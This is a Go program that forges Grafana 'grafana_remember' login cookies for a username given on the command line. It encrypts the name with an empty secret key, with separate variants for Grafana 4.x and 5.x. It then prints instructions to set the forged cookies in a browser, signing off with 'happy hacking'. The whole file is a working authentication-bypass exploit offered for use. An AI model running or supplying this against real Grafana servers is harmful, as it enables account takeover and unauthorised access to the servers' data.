package main

import (
	"golang.org/x/crypto/pbkdf2"
	"crypto/sha256"
	"github.com/Unknwon/com"
	"encoding/hex"
	"github.com/grafana/grafana/pkg/util"
	"crypto/md5"
	"os"
)

func main() {

	if len(os.Args) < 2 {
		println("usage: " + os.Args[0] + " <username>")
		os.Exit(1)
	}

	secret := ""
	value := os.Args[1]
	encryptedV5 := genCookieV5(secret, value)
	encryptedV4 := genCookieV4(secret, value)
	println("[i] delete the grafana_sess cookie from your browser session")
	println("[i] set following cookies in you browser:")
	println(" * for Grafana 5.x:")
	println("   grafana_user      : " + value)
	println("   grafana_remember  : " + encryptedV5)
	println(" * for Grafana 4.x:")
	println("   grafana_user      : " + value)
	println("   grafana_remember  : " + encryptedV4)
	println("[+] happy hacking ;)")

	//decrypted, err := decryptCookie(secret, encrypted)
	//if err != nil {
	//	panic("error: " + err.Error())
	//}
	//println("decrypted:" + decrypted)
}

func genCookie(secret string, value string) string {
	key := pbkdf2.Key([]byte(secret), []byte(secret), 1000, 16, sha256.New)
	text, err := com.AESGCMEncrypt(key, []byte(value))
	if err != nil {
		panic("error encrypting cookie: " + err.Error())
	}
	return hex.EncodeToString(text)
}

func genCookieV5(secret string, value string) string {
	return genCookie(secret, value)
}

func genCookieV4(secret string, value string) string {
	return genCookie(util.EncodeMd5(secret), value)
}

func decryptCookieV4(secret string, cookie string) (string, error) {
	cookietext, errc := hex.DecodeString(cookie)
	if errc != nil {
		return "", nil
	}

	m := md5.Sum([]byte(secret))
	secret = hex.EncodeToString(m[:])
	text, err := com.AESGCMDecrypt([]byte(secret), cookietext)
	if err != nil {
		return "", err
	}

	return hex.EncodeToString(text), nil
}

func decryptCookieV5(secret string, cookie string) (string, error) {
	text, err := hex.DecodeString(cookie)
	if err != nil {
		return "", nil
	}

	key := pbkdf2.Key([]byte(secret), []byte(secret), 1000, 16, sha256.New)
	text, err = com.AESGCMDecrypt(key, text)
	return string(text), err
}